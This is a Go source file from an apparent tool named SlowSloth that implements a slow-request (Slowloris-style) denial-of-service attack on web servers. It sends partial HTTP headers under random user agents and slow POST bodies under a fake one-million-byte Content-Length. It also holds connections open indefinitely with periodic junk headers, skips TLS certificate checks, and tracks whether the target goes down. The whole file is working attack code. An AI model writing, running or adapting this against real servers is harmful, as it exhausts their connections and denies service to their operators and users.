package slowrequest

import (
	"SlowSloth/common"
	"SlowSloth/pkg/statusprinter"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"sync"
	"time"
)

type RequestStrategy interface {
	SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error
}

type GetRequestStrategy struct{}

func (s *GetRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
	userAgent := common.GetRandomUserAgent()
	requestHeaders := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", urlObj.RequestURI(), urlObj.Hostname(), userAgent)
	_, err := conn.Write([]byte(requestHeaders))
	// Additional header writes with delays...
	return err
}

type PostRequestStrategy struct {
	Body string
}

func (s *PostRequestStrategy) SendRequest(conn net.Conn, urlObj *url.URL, rand *rand.Rand, delay time.Duration) error {
	userAgent := common.GetRandomUserAgent()
	fakeContentLength := 1000000 // A much larger content length
	requestHeaders := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\n\r\n", urlObj.RequestURI(), urlObj.Hostname(), userAgent, fakeContentLength)
	_, err := conn.Write([]byte(requestHeaders))
	if err != nil {
		return err
	}

	// Write the actual POST data slowly
	for _, chunk := range splitIntoChunks(s.Body, 10) { // Split the body into chunks
		_, err = conn.Write([]byte(chunk))
		if err != nil {
			return err
		}
		time.Sleep(delay)
	}

	return nil
}

// splitIntoChunks splits the string into chunks of the specified size.
func splitIntoChunks(s string, chunkSize int) []string {
	var chunks []string
	runes := []rune(s)

	for chunkSize < len(runes) {
		runes, chunks = runes[chunkSize:], append(chunks, string(runes[:chunkSize]))
	}

	if len(runes) > 0 {
		chunks = append(chunks, string(runes))
	}

	return chunks
}

type RequestManager struct {
	strategy      RequestStrategy
	statusManager *statusprinter.StatusManager
	rand          *rand.Rand
}

func NewRequestManager(strategy RequestStrategy, statusManager *statusprinter.StatusManager) *RequestManager {
	src := rand.NewSource(time.Now().UnixNano())
	return &RequestManager{
		strategy:      strategy,
		statusManager: statusManager,
		rand:          rand.New(src),
	}
}

func (rm *RequestManager) SendSlowRequest(wg *sync.WaitGroup, urlObj *url.URL, delay time.Duration) {
	defer wg.Done()
	rm.statusManager.IncrementActiveConnections()
	defer rm.statusManager.DecrementActiveConnections()

	var conn net.Conn
	var err error

	if urlObj.Scheme == "https" {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,             // Warning: Only for testing purposes
			MinVersion:         tls.VersionTLS11, // Set minimum TLS version
			MaxVersion:         tls.VersionTLS13, // Set maximum TLS version
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			},
		}
		conn, err = tls.Dial("tcp", urlObj.Host+":443", tlsConfig)
	} else {
		conn, err = net.Dial("tcp", urlObj.Host)
	}

	if err != nil {
		rm.statusManager.SetServiceAvailable(false)
		return
	}
	defer conn.Close()

	// Send the initial part of the request using the strategy pattern
	err = rm.strategy.SendRequest(conn, urlObj, rm.rand, delay)
	if err != nil {
		return
	}

	// Continuously send headers at intervals to keep the connection open
	ticker := time.NewTicker(delay)
	defer ticker.Stop()

	for range ticker.C {
		// Send a keep-alive part of the request
		_, err := conn.Write([]byte("X-a: b\r\n"))
		if err != nil {
			return
		}
	}
}
